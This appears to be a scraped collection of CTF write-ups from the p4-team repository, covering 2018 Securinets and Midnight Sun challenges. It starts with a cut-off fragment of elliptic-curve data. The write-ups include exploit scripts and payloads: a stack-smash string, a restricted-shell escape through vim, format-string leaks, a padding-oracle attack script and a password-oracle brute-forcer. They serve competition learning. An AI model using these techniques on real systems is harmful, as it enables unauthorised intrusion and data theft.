k2*G\n\nhere are the Qi that i got:\n\n[(656055339629 : 670956206845 : 1), \n(714432985374 : 30697818482 : 1), \n(519532969453 : 833497145865 : 1), \n(606806384185 : 353033449641 : 1), \n(370553209582 : 211121736115 : 1), \n(95617246846 : 666814491609 : 1), \n(474872055371 : 795112698430 : 1), \n(249845085299 : 222352033875 : 1), \n(850954431245 : 810446463695 : 1), \n(188731559428 : 877002121896 : 1), \n(168665615402 : 464872506873 : 1), \n(26722558561 : 269217869309 : 1), \n(16403346294 : 478534963882 : 1), \n(539749282946 : 332444159141 : 1), \n(932295517649 : 23439478940 : 1), \n(765194933041 : 920187938377 : 1), \n(853124087439 : 845601917928 : 1), \n(246454416048 : 212483699689 : 1), \n(312547608490 : 688107262695 : 1), \n(43261158649 : 439444472742 : 1), \n(320785434805 : 477080449838 : 1), \n(741706320740 : 672809544395 : 1), \n(361762297756 : 858805805323 : 1), \n(782235980044 : 600673464737 : 1), \n(69196762074 : 327427680437 : 1), \n(876001563166 : 573218279075 : 1), \n(117946101727 : 954797129239 : 1), \n(771781111553 : 314018907599 : 1), \n(579549799021 : 322325160055 : 1), \n(857081196493 : 464260539273 : 1), \n(852938568103 : 429083796488 : 1), \n(850954431245 : 810446463695 : 1), \n(55203632714 : 255470537391 : 1), \n(600464434215 : 605840305721 : 1), \n(620532163623 : 575613893944 : 1), \n(215810002861 : 481354983411 : 1), \n(538481263994 : 666638294130 : 1), \n(528666082457 : 895034116069 : 1), \n(296218553972 : 899557390183 : 1), \n(428618251485 : 445768511836 : 1), \n(632412058600 : 685699421425 : 1), \n(634041855232 : 495546745721 : 1), \n(570481762204 : 252944477333 : 1), \n(760959783781 : 435626456209 : 1)]\n", "timestamp": "2025-10-21T13:32:10.150943"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/crypto_worst_rsa/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/crypto_worst_rsa/README.md", "content": "# The worst RSA joke (Crypto)\n\nIn the task we get [public key](public.pem) and [ciphertext](flag.enc).\nThe description of the task states that someone decided to use a single prime as modulus for RSA encryption.\n\nThe difficulty of breaking RSA is based on the fact that the number of co-prime numbers to the modulus (so-called Euler's totient function) is secret.\nFor a prime number this value is known and is simply `p-1`.\nFor product of two co-prime numbers it is `(p-1)*(q-1)`, and here is the strength of RSA - in order to calculate this value we need to know prime factors of the modulus, and finding those is hard.\n\nIn our case this whole problem doesn't exist, since we know `p` and therefore we know `p-1` as well.\nTherefore we can simply calculate the private key exponent as `modinv(e,p-1)` and decrypt the ciphertext.\n\n```python\nimport codecs\n\nfrom Crypto.PublicKey import RSA\n\nfrom crypto_commons.generic import bytes_to_long\nfrom crypto_commons.rsa.rsa_commons import modinv, rsa_printable\n\n\ndef main():\n    with codecs.open(\"public.pem\", \"r\") as input_file:\n        pub = input_file.read()\n        pub = RSA.importKey(pub)\n        print(pub.e, pub.n)\n        with codecs.open(\"flag.enc\", 'r') as input_flag:\n            data = input_flag.read().decode(\"base64\")\n            d = modinv(pub.e, pub.n-1)\n            print(rsa_printable(bytes_to_long(data), d, pub.n))\n\n\nmain()\n```\n\nAnd we get `Flag{S1nGL3_PR1m3_M0duLUs_ATT4cK_TaK3d_D0wn_RSA_T0_A_Sym3tr1c_ALg0r1thm}`\n", "timestamp": "2025-10-21T13:32:10.412471"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/for_lone/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/for_lone/README.md", "content": "# Lone authot (forensics)\n\nIn the task we get a [zip file](lone_author.zip) which seems corrupted.\nWe notice that the PK headers are not right.\nIt should always be `04034b50` and in our case the 3rd byte is wrong.\nWe also notice that it's not any accidental flip.\nOnce we extract all wrong headers we can see a pattern:\n\n```\nPKF\nPKl\nPKa\nPKg\nPK{\nPKM\nPK3\nPK3\nPKt\nPK_M\nPK3\nPK_1\n```\n\nSo we've got a flag prefix -> `Flag{M33t_M3_1`\n\nOnce we fix those headers, we can finally extract the archive and we get [password protected zip](secret.zip) and [a piece of qr code](qr_ps.tif).\nWe initially thought we have to somehow fix the QR, but it turned out that in metadata there is:\n\n`<pdf:Author>Password to the second part is 0xNOX**</pdf:Author>`\n\nWe used this password on the zip archive we got, and we managed to extract the file:\n\n![](export.png)\n\nThis makes up the whole flag: `Flag{M33t_M3_1n_tHe_p4RK_T0mOrrOW}`\n", "timestamp": "2025-10-21T13:32:10.651065"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/pwn_no_mercy/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/pwn_no_mercy/README.md", "content": "# No mercy (Pwn)\n\nWe get [ELF binary](no_mercy) with canary and NX on.\nThere are two blatant buffer overflows in the code, since it's using `gets`:\n\n```c\nint main() {\n    var_AC = *(ecx + 0x4);\n    var_C = *0x14;\n    eax = 0x0;\n    var_70 = 'Flag'; //  0x08048573\n    var_6C = '{fla';\n    var_68 = 'g_is';\n    var_64 = '_on_';\n    var_60 = 'serv';\n    var_5C = 'er}';\n    eax = &var_58;\n    ecx = 0x0;\n    ebx = 0x1a & 0xfffffffc;\n    edx = 0x0;\n    do {\n            *(ebp + edx + 0xffffffa8) = 0x0;\n            edx = edx + 0x4;\n    } while (edx < ebx);\n    var_70 = 'Flag';\n    *(int16_t *)(eax + edx) = 0x0;\n    eax = 0x2 + eax + edx;\n    eax = strcpy(&var_A2, &var_70);\n    eax = printf(\"what's your name: \");\n    eax = gets(&var_3E); // Buffer overflow\n    eax = printf(\"Welcome %s\\n\", &var_3E);\n    eax = printf(\"so tell me a joke: \");\n    eax = gets(&var_70); // Buffer overflow\n    eax = printf(\"so silly , gtfo ==>[]\");\n    eax = dup2(0x1, 0x2);\n    esp = ((((((((esp - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;\n    eax = *0x14 ^ *0x14;\n    if (eax != 0x0) {\n            eax = __stack_chk_fail();\n    }\n    else {\n            ebx = stack[2046];\n            esp = &var_8 + 0xc;\n            ebp = stack[2047];\n            esp = stack[2045] + 0xfffffffc;\n    }\n    return eax;\n}\n```\n\nThe trick here is that once you smash the stack, the server actually sends you the error message.\nThis message contains the name of the binary.\nThe idea is to overwrite the pointer which points to the binary name, and place there the pointer to flag contents.\n\nThe payload we send is: `'a' * 234 + '\\x73\\x85\\x04\\x08'`.\nWe need to go up 234 bytes to reach the pointer position with binary name and then we overwrite it with the flag address.\nFrom this we get back: `Flag{sm4ash_argv_sm4sh_env_sm4sh_ev3rything!}`\n", "timestamp": "2025-10-21T13:32:10.966368"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-24-securinets/pwn_special/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-24-securinets/pwn_special/README.md", "content": "# Special (Pwn)\n\nA classic restricted shell jailbreak task.\nWe can ssh to a server and we get access via some kind of restricted shell.\nIt's all blackbox, so we need to poke around a bit to figure out what we can and can't do.\n\nWe get only messages from stderr, which makes things a bit harder.\nSending some random payloads tells us that our commands are executed via `bash -c \"cmd\"`.\nThere is also some input filtration applied.\n\nWe can send as command `$PWD` which shows error `bash: /home/special: Is a directory`.\nThis is very useful, because we can send for example `$PWDabcdefg....` and in the error log we get back the string without the filtrated characters.\nFrom this we know that we can use `{}|;:<>$'#^_+-` and all uppercase letters.\n\nNext we proceed with testing bash special variables, and from this we get an interesting result for `$_`:\n\n```\ndeclare -x A=\"T\"\ndeclare -x AB=\"HI\"\ndeclare -x ABC=\"ISN\"\ndeclare -x ABCD=\"OTTH\"\ndeclare -x ABCDE=\"EFLAG\"\ndeclare -x ABCDEF=\"BUTMAY\"\ndeclare -x ABCDEFG=\"BEITCAN\"\ndeclare -x ABCDEFGH=\"HELPGETT\"\ndeclare -x ABCDEFGHI=\"INGFLAG:D\"\ndeclare -x OLDPWD\ndeclare -x PWD=\"/home/special\"\ndeclare -x SHELL=\"\"\ndeclare -x SHLVL=\"1\"\ndeclare -x _=\"export\"\n```\n\nNow what we want to do, is to create some meanigful command.\nSadly we don't have `()` so we can't do any `calculations` and therefore create numbers.\nThe intended solution was to use `${#variable_name}` to get length of the variable, and thus get some numbers, but we didn't know that...\n\nWhat we can do is to use `${variable:K:N}` which is a substring from index `K` with length `N`.\nWe have only `$SHLVL` which has value `1` and `$#` with value `0`, and with those we can get:\n\n```\nslash -> ${PWD::$SHLVL}\nh -> ${-::$SHLVL}\na -> ${PWD:$SHLVL$SHLVL:$SHLVL}\ni -> ${PWD:$SHLVL$#:$SHLVL}\ne -> ${_:$#:$SHLVL}\nx -> ${_:$SHLVL:$SHLVL}\n```\n\nAgain, the intended solution was to get `s` and `h` and spawn a shell, but we didn't have `s`.\nFortunately we figured out that we can run `ex` command, which spawns `vim`!\n\nFrom `vim` we can simply run `:!sh` to spawn a shell, and read the flag: `Flag{B4sh_subst1tut1on_is_gud!}`\n", "timestamp": "2025-10-21T13:32:11.204794"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/README.md", "content": "# Midnight Sun CTF Quals\n\nTeam: akrasuski1, sasza, chivay, borysp, nazywam, shalom, ziolek\n\n### Table of contents\n\n* [isoar (web)](isoar)\n* [Whistleblower (crypto)](crypto_whistleblower)\n* [babyshells (pwn)](babyshells)\n* [botpanel (pwn)](botpanel)\n* [diary (misc)](diary)\n* [gibson (pwn)](gibson)\n* [hashcash (pwn)](hashcash)\n* [pwndoor (re)](pwndoor)\n* [randumb (pwn)](randumb)\n", "timestamp": "2025-10-21T13:32:12.626713"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/babyshells/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/babyshells/README.md", "content": "# Babyshells - Pwn (50 + 0)p, 65 solves\n\n> If you hold a babyshell close to your ear, you can hear a stack getting smashed\n\nIn this task we were given three binaries and three corresponding `host:port` pairs to pwn. These binaries\nwere in x86, ARM and MIPS architectures respectively, but they all were very simple. They had no NX, and \njumped right into our supplied buffer. Googling \"$ARCH + shellcode\" and sending the result was enough to solve\nthe challenge.\n", "timestamp": "2025-10-21T13:32:12.866780"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/botpanel/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/botpanel/README.md", "content": "# Botpanel - Pwn (300 + 0), 17 solves\n\n> These cyber criminals are selling shells like hot cakes off thier new site. Pwn their botpanel for us so we can stop them\n\nIn this task we were given a binary and `host:port` where it is running. Connecting there we get a banner\nand password prompt. After analyzing the binary, we notice that there is a format string bug - typing `%s` would \neither crash or print garbage.\n\nIt turns out the expected password is stored in a local variable, so we could use `%7$s` to get the correct password echoed:\n\n```\n\t\tPanel password: %7$s\n\t\tIncorrect! 4 attempts left\n\t\tYour attempt was: >@!ADMIN!@<\n```\nLogging in, we get a simple menu, but anything we try is restricted due to running in \"trial mode\". Analyzing the binary, it\nseems the boolean holding the current mode is initialized in the login function - since there's the format bug, we could\noverwrite it using `%6$n`.\n\nAfter doing this, we get \"registered mode\" menu. It allows to send invites to arbitrary host:port - which spawn a new\nthread which connects back to specified IP. The invited menu in turn allows to send feedback. The feedback option\nfirst asks for length, then the feedback string. It is immediately suspicious, but there are checks for the length\nbeing in reasonable size, so no obvious buffer overflow is there. However, the read buffer length is a global variable,\nmeaning we can send normal length in one connection, get it to pass the checks, then send large length in second connection,\nand finally send large buffer in the first one. This allows us to overflow the buffer, overwriting the return address and\nallowing the ROP.\n\nThere were a couple of other roadblocks still. First of all, there was a stack cookie. Thankfully, on Linux the stack\ncookie is constant for the whole process duration, so we were able to leak it during the login phase at the start,\nusing `%15$x`. Second problem was that the ASLR was turned on, so we had to find the address the binary was loaded at.\nWe did it in the same way, via leaking return address during login procedure: `%19$x`.\n\nThe binary was rather small, so there was not enough gadgets to easily make a reliable exploit - our solution\nincrements (bytewise) `puts` function GOT entry so that it points to `system`. Because it is bytewise incrementation,\nthe possible carry is ignored, so the result may be wrong. Still, the exploit works about half the time.\nThe whole code is available in `doit.py`.\n", "timestamp": "2025-10-21T13:32:13.100299"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/crypto_whistleblower/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/crypto_whistleblower/README.md", "content": "# Whistleblower (crypto)\n\nIn the task we get a [pcap](capture_corrupted.pcap) and link do a webpage. \nThe pcap contains interaction between the user and the webpage.\n\nThe webpage lets you to input some text and then submit this to the server.\nBefore the data is sent, a random 128bit key is generated on the client side using Web Crypto API, and sent to the server with some randomly assigned ID using `/key` endpoint.\nNext the data are encrypted using this key with AES-CBC and data with IV are submitted to the server via `/data` endpoint.\n\nIn the PCAP we can find the ciphertex:\n\n```json\n{\"ciphertext\":\"680a2f38d93aaf86e562ab01bb6f7ef9eaf50a2e393bb2262d5d0f32541a7543bf6361220aa7cc1ad1a94efd6ed2fa99aa80c26379316199e70b6c7fbb2d9f81272fce8abf1edf8facce85a8dc89a9eb9d16ca22845545e55460d99c8fe98e383c25b9acc108ea88c7f6cf6666ccc4f56db3886ce0524b185c58aea95e59659c\",\"keyid\":\"e845799dc6bb731000221f5e20587814\"}\n```\n\nbut the key is not there:\n\n```json\n{\"key\":\"corrupted_missing_data_not_here!\",\"id\":\"e845799dc6bb731000221f5e20587814\"}\n```\n\nWe have only ciphertext and the ID of the key.\n\nIf we try to use the webpage we can notice that we get HTTP-500 response from the `/key` endpoint with message:\n\n```json\n{\n  \"message\": \"key store in read-only maintenance mode\", \n  \"status\": \"error\"\n}\n```\n\nSo it seems we can't store a new key on the server.\nBut in the pcap we can see the user could do it, so his key is on the server.\n\nAlso when sending data we get HTTP-404 error from `/data` endpoint with message:\n\n```json\n{\n  \"message\": \"key not found\", \n  \"status\": \"error\"\n}\n```\n\nSo there is some verification of the keyid we pass.\n\nFinally if we try to submit the same data we got from pcap, we get `message stored` response.\nBut if we try sending random ciphertext with existing keyid, we get `decryption error`.\n\nThere is no special signature added to the data, so decryption failure can come only from incorrect padding.\nAnd this means we have a classic `padding oracle` here (we've described the idea multiple times already in our writeups, so won't go into details here), so we can run:\n\n```python\nimport requests\n\nfrom crypto_commons.symmetrical.symmetrical import oracle_padding_recovery\n\ns = requests.session()\n\n\ndef oracle(ct):\n    url = \"http://web.midnightsunctf.se/data\"\n    data = {\"ciphertext\": ct, \"keyid\": \"e845799dc6bb731000221f5e20587814\"}\n    r = s.post(url, json=data)\n    return r.status_code == 200 # return True if padding was correct\n\n\ndef main():\n    ct = '680a2f38d93aaf86e562ab01bb6f7ef9eaf50a2e393bb2262d5d0f32541a7543bf6361220aa7cc1ad1a94efd6ed2fa99aa80c26379316199e70b6c7fbb2d9f81272fce8abf1edf8facce85a8dc89a9eb9d16ca22845545e55460d99c8fe98e383c25b9acc108ea88c7f6cf6666ccc4f56db3886ce0524b185c58aea95e59659c'\n    oracle_padding_recovery(ct, oracle)\n\n\nmain()\n```\n\nAnd recover full plaintext: `I have discovered a secret flag. It is: midnight{p4dding_padd1ngt0n_th3_0r4cl3} Please do not tell anyone`\n", "timestamp": "2025-10-21T13:32:13.355451"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/diary/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/diary/README.md", "content": "# Diary - Misc (50 + 0), 120 solves\n\n> We found a torn diary on the ground. It seems to belong to a local boy.\n\nIn this task we were given a small zipped git repository. Trying to do anything with it (`git log` etc.) failed\nwith errors. It seemed like we had to find the flag in raw git objects then.\n\nThe first thing we did was enough - a simple inspection of the objects:\n\n```\nλ cat doit.sh \nzlib-flate -uncompress < $1 | strings  | grep midnight\nλ find -exec bash doit.sh {} \\;\nflate: inflate: data: incorrect header check\nflate: inflate: data: incorrect header check\nToday I found a flag, it said: midnight{if_an_object_ref_falls_and_no_one_hears} that sounds very interesting.\n```\n", "timestamp": "2025-10-21T13:32:13.611842"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-04-14-midnight-quals/isoar/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-04-14-midnight-quals/isoar/README.md", "content": "# Isoar(Web, 31 solves, 150pts)\n\n\nWe start off with a url to the website: http://web.midnightsunctf.se:8000\nThe webapp allows us to check our passwords strength and receive a random fact about the supplied password:\n\n```\n\"The given password occurs as part of 10 out of 1001 known passwords\"\n\"The given password has 0 lowercase characters\"\n\"The given password has the same amount of uppercase characters as 997 out of 1001 known passwords\"\n\"The given password is shorter than 399 out of 1001 known passwords\"\n\"The given password is longer than 155 out of 1001 known passwords\"\n\"The first character of the given password occurs in 137 out of 1001 known passwords\"\n\"The third character of the given password occurs in 83 out of 1001 known passwords\"\n\"2 out of 1001 known passwords are suffixed with the given password\"\n\"The given password has 6 characters\"\n\"The given password has 6 digits\"\n\"The fifth character of the given password occurs in 53 out of 1001 known passwords\" \n```\n\n\n\n`http://web.midnightsunctf.se:8000/robots.txt` has an interesting entry: `Disallow: /static/public.password.list`\n\n\n[public.password.list](public.password.list) contains a list of 1000 common passwords while the messages mention 100**1** passwords, perhaps the admins password is included in the analysis but not the list?\n\n\nThe most interesting response type is `\"2 out of 1001 known passwords are suffixed with the given password\"`. Using that, we can try a bunch of suffixes and by calculating our version of the output (we do have 1000 out of the 1001 passwords) we're able to tell if admins password is included in their output or not.\n\nThat is actually enough to just brute-force the password char by char, but as it turns out that is **super** slow, mainy because:\n\n * We have to calculate a 2 byte proof of work for each request\n * The output message type is also randomized so we have to try a bunch of them before getting the correct one\n\n// PS: You might think that we could bypass the poc by sending the same poc output and try to get the correct message type but it seems the message type actually depended on the poc output\n\n\nWhat we're gonna need is a charset.\n\nAnother type of an interesting response is `\"The fifth character of the given password occurs in 53 out of 1001 known passwords\"` it tells us in how many passwords a certain letter from our supplied password occurs.\n\nWe can throw against it a lot of random passwords and build the admins password charset using the same technique as with the suffixes.\n\nPutting all of this together, we get:\n\nA boilerplate with required primitives:\n\n``` python\nimport requests\nfrom hashlib import sha256\nimport random\nimport string\nimport json\nimport re\n\n\nalph = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\ndef password_poc(password):\n\twhile True:\n\t\tpoc = ''.join([random.choice(alph) for x in range(10)])\n\t\tif sha256(password+poc).hexdigest().startswith('1337'):\n\t\t\treturn poc\n\ndef check_password(password):\n\turl = \"http://web.midnightsunctf.se:8000/pwmeter/%s/%s\" % (password, poc)\n\tr = requests.get(url)\n\treturn r.content\n\n\nwith open('public.password.list') as f:\n\tpasswords = f.read().split('\\n')\n\n\ndef count_words(position, letter):\n\ts = filter(lambda x: letter in x, passwords)\n\treturn len(s)\n\ntranslate_pos = {'first':0, 'second':1, 'third':2, 'fourth':3, 'fifth':4}\n```\n\n\n\nScript to scrap the charset\n\n``` python\n\nCHARSET = \"\"\n\nwhile True:\n\trand_input = ''.join([random.choice(alph) for x in range(random.randint(1, 16))])\n\treg = r\"The (.*) character of the given password occurs in (.*) out of 1001 known passwords\"\n\t\n\tresponse = json.loads(check_password(rand_input))[\"analysis\"]\n\n\tre_found = re.findall(reg, response)\n\tif re_found:\n\t\tposition, number = re_found[0]\n\t\tnumber = int(number)\n\n\t\tletter = None\n\t\tpos = None\n\n\t\tif position == 'last':\n\t\t\tletter = rand_input[-1]\n\t\t\tpos = len(rand_input)-1\n\t\telse:\n\t\t\tpos = translate_pos[position]\n\t\t\tletter = rand_input[pos]\n\n\t\tmy_count = count_words(pos, letter)\n\n\t\tif my_count != number:\n\t\t\tprint(letter)\n\t\t\tif letter not in CHARSET:\n\t\t\t\tCHARSET += letter\n\t\t\t\tprint(CHARSET)\n```\n\n\nScript to finally find the password\n\n``` python\ndef count_word_suffix(suffix):\n\ts = filter(lambda x:x.endswith(suffix), passwords)\n\treturn len(s)\n\n\nfinal_password = \"\"\n\nwhile True:\n\t#                    found charset\n\tfor letter_addon in 'lryHws3od0P4':\n\t\tprint(letter_addon)\n\t\trand_input = letter_addon + final_password\n\t\t\n\t\tfound = False\n\t\twhile True:\n\n\t\t\treg = r\"(.*) out of 1001 known passwords are suffixed with the given password\"\n\n\t\t\tr = re.findall(reg, json.loads(check_password(rand_input))['analysis'])\n\n\t\t\tif r:\n\t\t\t\ttheir_count = int(r[0])\n\t\t\t\tmy_count = count_word_suffix(rand_input)\n\n\t\t\t\tif their_count != my_count:\n\t\t\t\t\tprint(their_count, my_count, rand_input)\n\t\t\t\t\tfinal_password = letter_addon + final_password\n\t\t\t\t\tprint(final_password)\n\t\t\t\t\tfound=True\n\t\t\t\telse:\n\t\t\t\t\tprint(\"no\")\n\n\t\t\t\tbreak\n\t\tif found:\n\t\t\tbreak\n```\n\nRunning all of this finally gave us the password:`H3rHolyP4ssw0rd`\nAnd the flag: `midnight{Someone_didnt_bother_reading_my_carefully_prepared_memo_on_commonly_used_passwords}`\n\n", "timestamp": "2025-10-21T13:32:13.962227"}
